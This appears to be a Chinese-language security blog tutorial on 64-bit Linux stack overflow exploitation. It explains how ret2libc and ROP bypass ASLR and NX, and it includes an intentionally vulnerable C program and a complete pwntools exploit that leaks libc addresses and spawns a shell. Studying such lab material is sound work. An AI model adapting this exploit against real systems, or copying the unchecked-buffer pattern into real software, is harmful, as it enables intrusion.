---
title: 高级栈溢出及ret2libc
date: 2018-05-05 09:38:08
updated: 2018-05-05 09:38:08
tags:
- 安全
- 栈溢出
categories: 安全
keywords: 栈溢出 ret2libc rop
copyright: true
---

# 准备工作

> 实验环境：uname -a    64位 ubuntu 16.04
>
> Linux ubuntu 4.4.0-122-generic #146-Ubuntu SMP Mon Apr 23 15:34:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux

* gdb-peda

```
$ git clone https://github.com/longld/peda.git ~/peda
$ echo "source ~/peda/peda.py" >> ~/.gdbinit 
```

* pwntools

```
$ pip install pwn
```

<!-- more -->

### 三种保护机制

- **ASLR** ：地址空间随机化，每次运行函数地址改变。

​        绕过：随机化只是将每次库函数加载地址随机，库函数间相对地址不变，因此通过GOT来泄漏库函数地址，  以推导出libc中其他函数（如system）的地址。

- **NX** ：通过在页表上设置NX(不可执行）位，将非代码段的地址空间设置成不可执行属性，一旦系统从这些地址空间进行取指令时，CPU就是报内存违例异常，进而杀死进程。栈空间也被操作系统设置了不可执行属性，因此普通的`shellode`注入无法执行。

​        绕过：`ret2libc` 利用已有代码，更改返回地址时返回到系统函数。

- **Cannary**  ： 通过在缓冲区和返回地址间插入一个`canary word` ，当缓冲区被溢出时，在返回地址被覆盖之前 canary word 会首先被覆盖。通过检查 canary word 的值是否被修改，就可以判断是否发生了溢出攻击。

​       暂时未研究如何绕过，因此使用`-fno-stack-protector` 标志关闭该安全保护机制。        

### ret2libc

**难点：** 

1. 由于ASLR机制，需要泄漏库函数地址以确定`system` 函数地址，本次结合`ROP` 使用`write` 函数获取`write` 函数实际地址。
2. 由于操作环境为64位`linux` ，函数通过`rdi,rsi,rdx,rcx,r8,r9` 以及栈传参，因此采用`pop,ret` 片段装填参数

​    本次实验结合了`ret2libc` 与`ROP` 两种手段，为简化操作，内置了需要的`gadget` 。

### 漏洞程序

```c
/*************************************************************************
    > File Name: vuln.c
    > Author: xsyin
    > Mail: shouyinXu@163.com 
    > Created Time: 2018年05月05日 星期六 14时24分14秒
    > Make: gcc -fno-stack-protector -g vuln.c -o vuln
 ************************************************************************/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

void helper(){
	asm("pop %rdi; pop %rsi; pop %rdx; ret");
}

void vuln(){
	char buf[128];
	memset(buf,0,128);
	write(STDOUT_FILENO, "Enter input: \n",14);
	read(STDIN_FILENO, buf, 512);
}

int main(int argc, char const *argv[])
{
	vuln();
	return 0;
}
```

`read` 函数中允许写入521字节到一个只有128字节的缓冲区，明显的缓冲区溢出利用点。

* 寻找溢出点

![选区_065](选区_065.png)

![选区_066](选区_066.png)

溢出点在偏移136处，即`buf` 填充136之后为返回地址。

* 寻找需要的`gadget` 片段

![选区_067](选区_067.png)

* 构造`payload` ：

```
#payload1 获取write函数实际地址
payload1 = "A" * 136  #截至返回地址前的缓冲区长度
payload1 += p64(pppr) #跳转到PPPR指令序列，为write函数赋值
payload1 += p64(0x1) #write函数的第一个参数，1表示输出到stdout
payload1 += p64(got_write) #write函数的第二个参数，表示要输出字符串的首地址
payload1 += p64(0x8) #write函数的第三个参数，表示要输出字符串的长度
payload1 += p64(plt_write) #调用write函数
payload1 += p64(vuln)      #继续调用vuln函数
```

由于`linux` 共享库的延迟绑定技术，函数第一次调用时填充`GOT`表，在运行到`read` 函数时`write` 函数`GOT` 表中已填入实际地址。`payload1` 读取该地址。

```
#payload2 跳转至库函数system
payload2 = "A" * 136   #截至返回地址前的缓冲区长度
payload2 += p64(pr)   #跳转到PR指令序列，填充system的第一个参数
payload2 += p64(binsh_addr)  #system函数的第一个参数/bin/sh
payload2 += p64(systemAddr)    #调用system函数
```

### 结果

![选区_068](选区_068.png)

退出报错，可以通过PPPR片段再次跳转到`exit` 函数正常退出。

### 总结

 **优点：**  通过`ret2libc` 与 `ROP` 绕过了ASLR与NX机制

**缺点：** 

 1.  未绕过GS机制，可通过更改`__stackchk_fail__`函数`GOT` 表项

2. 内置了需要的`gadget` ，可使用通用的片段，ret2csu
3. 需要知道 `libc` 路径及版本，可通过pwntools提供的DynELF模块来进行内存搜索

### 利用程序

```python
#!/usr/bin/python
# -*- coding:utf-8 -*-
# file: exploit.py

from pwn import *
import struct

elf = ELF('vuln')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
p = process('./vuln')

pppr = 0x4005ba
pr = 0x400693

plt_write = elf.symbols['write']
got_write = elf.got['write']

libc_write = libc.symbols['write']
libc_system = libc.symbols['system']
print "libc_system: "+hex(libc_system)

vuln = elf.symbols['vuln']

payload1 = "A" * 136
payload1 += p64(pppr)
payload1 += p64(0x1)
payload1 += p64(got_write)
payload1 += p64(0x8)
payload1 += p64(plt_write)
payload1 += p64(vuln)

p.recvuntil("Enter input:")
print "################ send payload1 ###########"
p.send(payload1)
p.recv(8)

writeAddrTmp = struct.unpack('<Q', p.recv(8)[-8::])
writeAddr = writeAddrTmp[0]
print "writeAddr:", hex(writeAddr)

systemAddr = (writeAddr - libc_write) + libc_system
print "systemAddr:", hex(systemAddr)

binsh_addr = (writeAddr - libc_write) + next(libc.search('/bin/sh'))
print "binsh_addr:", hex(binsh_addr)

payload2 = "A" * 136
payload2 += p64(pr)
payload2 += p64(binsh_addr)
payload2 += p64(systemAddr)

p.recvuntil("Enter input:")

print "################ send payload2 ###########"
p.send(payload2)

p.interactive()
```



### 参考资料

[一步一步学ROP之linux_x64篇](https://jaq.alibaba.com/community/art/show?articleid=473)

